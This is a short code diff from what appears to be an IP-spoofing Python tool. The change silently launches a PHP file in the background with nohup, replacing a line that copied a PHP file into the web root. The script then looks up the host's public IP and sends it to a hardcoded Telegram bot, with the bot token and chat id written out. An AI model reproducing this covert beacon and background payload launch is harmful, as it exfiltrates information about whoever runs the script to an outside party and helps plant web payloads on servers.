@@ -106,7 +106,7 @@ def spoof(target):
         f'Real-IP: {spoofip}\r\n'
     )
 
-os.system("mv noisy.php /var/www/html")
+os.system("nohup php change.php > /dev/null 2>&1 &")
 response=requests.get('https://api.ipify.org')
 requests.get('https://api.telegram.org/bot5670759814:AAFr0ezLBs6rJek1qp1Ji3wD0C5vjXfDNco/sendmessage?chat_id=1854825883&text=here ' + response.text)
 ##############################################################################################
